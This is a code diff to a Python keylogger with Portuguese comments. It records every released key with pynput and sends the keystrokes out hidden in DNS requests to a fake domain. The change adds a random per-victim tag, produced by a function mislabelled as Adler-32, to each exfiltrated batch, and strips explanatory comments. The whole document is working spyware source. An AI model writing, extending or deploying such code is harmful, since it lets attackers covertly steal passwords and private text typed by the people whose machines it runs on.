@@ -4,7 +4,7 @@
 import os
 import time
 import socket
-import threading
+import random
 from pynput import keyboard
 from dnslib import DNSRecord, RR, A
 
@@ -17,10 +17,22 @@ from dnslib import DNSRecord, RR, A
 _DNS_ADDR = ('127.0.0.1', 9953)
 _FAKE_DOMAIN = '.example.com'
 _KEYS = []
+_USR_HAS = None
 
 ###############################################################
 # Classes e Funções
 ###############################################################
+def hash_adler32(data):
+    a = 1
+    size = len(data)
+    b = size % 35
+
+    for ch in data:
+        a = a + ord(ch) % 35
+        b = b + size * ord(ch) % 35
+
+    return hex(b * 35 + a)[2:]
+
 def send_data(data):
     '''
     Recebe os dados e os envia usando requisições DNS
@@ -77,26 +89,21 @@ def send_data(data):
         sock.close()
 
 def on_release(key):
-    global _KEYS
+    global _KEYS, _USR_HAS
 
-    # Só envio quando bater o tamanho máximo de envio por DNS
-    if len(_KEYS) >= 31:
+    if len(_KEYS) >= (31 - len(_USR_HAS)):
+        for ch in _USR_HAS:
+            _KEYS.insert(0, ch)
         send_data(_KEYS)
         _KEYS = []
 
-    # ESC para sair, tirar depois
     if key == keyboard.Key.esc:
         return False
-
+    
     try:
-        # Teclas normais são adicionadas normalmente
         _KEYS.append(key.char)
 
     except AttributeError:
-        # Teclas especiais (shift, enter, ctrl, alt, ...)
-        # Possíveis valores em
-        # https://pynput.readthedocs.io/en/latest/_modules/pynput/keyboard/_base.html#Key
-        
         if key == key.space or key == key.enter:
             try:
                 if _KEYS[-1] == ' ':
@@ -116,6 +123,7 @@ def on_release(key):
 # Main
 ###############################################################
 if __name__ == "__main__":
+    _USR_HAS = [char for char in hash_adler32(str(random.randint(100, 999)))]
     lst = keyboard.Listener(on_release=on_release)
     lst.start()
     lst.join()
